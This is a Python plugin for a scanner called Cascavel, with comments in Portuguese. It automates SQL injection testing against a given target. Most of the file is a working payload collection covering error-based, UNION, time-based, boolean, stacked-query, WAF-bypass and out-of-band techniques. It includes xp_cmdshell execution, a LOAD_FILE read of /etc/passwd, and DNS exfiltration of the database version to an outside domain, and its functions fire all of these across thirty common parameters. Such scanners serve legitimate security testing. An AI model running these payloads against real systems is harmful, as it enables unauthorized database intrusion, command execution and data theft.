# plugins/sqli_scanner.py — Cascavel 2026 Intelligence
import requests
import time
import urllib.parse


PARAMS = [
    "id", "user", "username", "page", "name", "search", "query", "cat",
    "item", "product", "order", "sort", "filter", "type", "action",
    "report", "role", "update", "key", "email", "year", "month",
    "col", "field", "row", "view", "table", "dir", "from", "to",
]

# ──────────── ERROR-BASED PAYLOADS ────────────
ERROR_PAYLOADS = [
    # Classic
    ("' OR '1'='1", "CLASSIC_OR"),
    ("' OR '1'='1' --", "CLASSIC_COMMENT"),
    ("' OR '1'='1' #", "HASH_COMMENT"),
    ("1' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL_VERSION"),
    # EXTRACTVALUE / UPDATEXML (MySQL 5.1+)
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", "EXTRACTVALUE"),
    ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--", "UPDATEXML"),
    # PostgreSQL
    ("' AND 1=CAST((SELECT version()) AS int)--", "PG_CAST_ERROR"),
    # Oracle
    ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", "ORACLE_UTL"),
    # SQLite
    ("' AND 1=1 UNION SELECT sql FROM sqlite_master--", "SQLITE_SCHEMA"),
]

# ──────────── UNION-BASED (auto column detection) ────────────
UNION_PAYLOADS = [
    ("' UNION SELECT NULL--", "UNION_1COL"),
    ("' UNION SELECT NULL,NULL--", "UNION_2COL"),
    ("' UNION SELECT NULL,NULL,NULL--", "UNION_3COL"),
    ("' UNION SELECT NULL,NULL,NULL,NULL--", "UNION_4COL"),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION_5COL"),
    ("' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,version(),0x7e),NULL--", "UNION_VERSION"),
]

# ──────────── TIME-BASED BLIND ────────────
TIME_PAYLOADS = [
    ("' OR SLEEP(4)--", "TIME_MYSQL", 3.5),
    ("'; WAITFOR DELAY '0:0:4'--", "TIME_MSSQL", 3.5),
    ("' OR pg_sleep(4)--", "TIME_POSTGRES", 3.5),
    ("' || (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)--", "TIME_PG_CASE", 3.5),
    ("1; SELECT BENCHMARK(5000000,SHA1('test'))--", "BENCHMARK_MYSQL", 3.0),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--", "SUBQUERY_SLEEP", 3.5),
]

# ──────────── BOOLEAN-BASED BLIND ────────────
BOOL_PAYLOADS = [
    ("' AND 1=1--", "BOOL_TRUE"),
    ("' AND 1=2--", "BOOL_FALSE"),
    ("' AND SUBSTRING(@@version,1,1)='5'--", "BOOL_VERSION_5"),
    ("' AND SUBSTRING(@@version,1,1)='8'--", "BOOL_VERSION_8"),
]

# ──────────── WAF BYPASS 2026 ────────────
WAF_BYPASS_PAYLOADS = [
    ("' oR '1'='1", "CASE_ALTERNATION"),
    ("'/**/OR/**/1=1--", "INLINE_COMMENT"),
    ("' OR 1=1-- -", "DOUBLE_DASH_SPACE"),
    ("1' aNd 1=1 aNd '1'='1", "MIXED_CASE_AND"),
    ("'/*!50000OR*/1=1--", "VERSION_COMMENT"),
    ("' %55NION %53ELECT NULL--", "URL_ENCODE_KEYWORDS"),
    ("' uni%6fn se%6cect null--", "PARTIAL_ENCODE"),
    ("' /*!50000UNION*/ /*!50000SELECT*/ NULL--", "NESTED_COMMENT"),
    ("'+OR+'1'='1", "PLUS_CONCAT"),
    ("'||1=1--", "PIPE_OR"),
    # Double URL encoding
    ("%2527%2520OR%25201%253D1--", "DOUBLE_URL_ENCODE"),
    # HPP (HTTP Parameter Pollution)
    ("1&id=' OR '1'='1", "HPP_DUPLICATE"),
]

# ──────────── STACKED QUERIES ────────────
STACKED_PAYLOADS = [
    ("'; SELECT pg_sleep(4);--", "STACKED_PG"),
    ("'; EXEC xp_cmdshell('ping 127.0.0.1');--", "STACKED_MSSQL_CMD"),
    ("'; INSERT INTO log VALUES('cascavel');--", "STACKED_INSERT"),
]

# ──────────── OOB (Out-of-Band) ────────────
OOB_PAYLOADS = [
    ("' UNION SELECT LOAD_FILE('/etc/passwd')--", "OOB_LOAD_FILE"),
    ("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.oob.cascavel.io\\\\a'))--", "OOB_DNS_EXFIL"),
]

SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite3",
    "unclosed quotation", "you have an error in your sql",
    "microsoft ole db", "syntax error", "query failed",
    "warning: mysql", "valid mysql result", "postgresql",
    "unterminated string", "quoted string not properly terminated",
    "jdbc", "odbc", "hibernate", "sqlexception", "pdo",
    "sequelize", "typeorm", "prisma", "knex",
]


def _check_error_based(resp_text, method, param):
    """Verifica erros SQL expostos na resposta."""
    lower = resp_text.lower()
    for err in SQL_ERRORS:
        if err in lower:
            return {
                "tipo": "SQLI_ERROR_BASED", "metodo": method,
                "parametro": param, "severidade": "CRITICO",
                "erro_detectado": err, "amostra": resp_text[:300],
            }
    return None


def _check_time_based(method, elapsed, threshold, param):
    """Detecta SQLi time-based via delay na resposta."""
    if elapsed > threshold:
        return {
            "tipo": "SQLI_TIME_BASED", "metodo": method,
            "parametro": param, "severidade": "CRITICO",
            "tempo_resposta": round(elapsed, 2),
        }
    return None


def _check_boolean_diff(resp_true_len, resp_false_len, param):
    """Detecta SQLi boolean-based via diferença de tamanho."""
    diff = abs(resp_true_len - resp_false_len)
    if diff > 50:
        return {
            "tipo": "SQLI_BLIND_BOOLEAN",
            "parametro": param, "severidade": "ALTO",
            "diff_bytes": diff,
        }
    return None


def _test_error_and_union(target, param):
    """Testa error-based e union-based em um parâmetro."""
    findings = []
    all_payloads = ERROR_PAYLOADS + UNION_PAYLOADS + WAF_BYPASS_PAYLOADS + OOB_PAYLOADS + STACKED_PAYLOADS
    for payload, method in all_payloads:
        url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
        try:
            resp = requests.get(url, timeout=8)
            vuln = _check_error_based(resp.text, method, param)
            if vuln:
                findings.append(vuln)
                if "CRITICO" in vuln.get("severidade", ""):
                    break
        except Exception:
            continue
    return findings


def _test_time_based(target, param):
    """Testa time-based blind SQLi."""
    for payload, method, threshold in TIME_PAYLOADS:
        url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
        try:
            start = time.time()
            requests.get(url, timeout=12)
            elapsed = time.time() - start
            vuln = _check_time_based(method, elapsed, threshold, param)
            if vuln:
                return vuln
        except requests.Timeout:
            return {
                "tipo": "SQLI_TIME_BASED", "metodo": method,
                "parametro": param, "severidade": "ALTO",
                "timeout": True,
            }
        except Exception:
            continue
    return None


def _test_boolean_based(target, param):
    """Testa boolean-based blind SQLi."""
    try:
        r_true = requests.get(f"http://{target}/?{param}=' AND 1=1--", timeout=6)
        r_false = requests.get(f"http://{target}/?{param}=' AND 1=2--", timeout=6)
        return _check_boolean_diff(len(r_true.text), len(r_false.text), param)
    except Exception:
        return None


def _test_post_injection(target, param):
    """Testa SQLi via POST body (JSON + form)."""
    for payload, method in ERROR_PAYLOADS[:5]:
        try:
            resp = requests.post(f"http://{target}/", json={param: payload}, timeout=6,
                                 headers={"Content-Type": "application/json"})
            vuln = _check_error_based(resp.text, f"POST_{method}", param)
            if vuln:
                return vuln
        except Exception:
            continue
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner SQL Injection 2026-Grade — Error/Union/Time/Boolean/Stacked/OOB.

    Técnicas: EXTRACTVALUE/UPDATEXML (MySQL), CAST error (PG), UTL_INADDR (Oracle),
    UNION auto-column, time-based (SLEEP/WAITFOR/pg_sleep/BENCHMARK), boolean diff,
    WAF bypass (inline comments, version comments, double URL encoding, HPP),
    stacked queries, OOB DNS exfiltration, POST body injection.
    40+ payloads cobrindo MySQL/PostgreSQL/MSSQL/Oracle/SQLite.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for param in PARAMS:
        # Error + Union + WAF bypass + OOB + Stacked
        vulns.extend(_test_error_and_union(target, param))

        # Time-based blind
        time_vuln = _test_time_based(target, param)
        if time_vuln:
            vulns.append(time_vuln)

        # Boolean-based blind
        bool_vuln = _test_boolean_based(target, param)
        if bool_vuln:
            vulns.append(bool_vuln)

        # POST injection
        post_vuln = _test_post_injection(target, param)
        if post_vuln:
            vulns.append(post_vuln)

    return {
        "plugin": "sqli_scanner",
        "versao": "2026.1",
        "tecnicas": ["error_based", "union_based", "time_based", "boolean_blind",
                      "waf_bypass", "stacked_queries", "oob_exfil", "post_injection"],
        "resultados": vulns if vulns else "Nenhuma SQL injection detectada",
    }
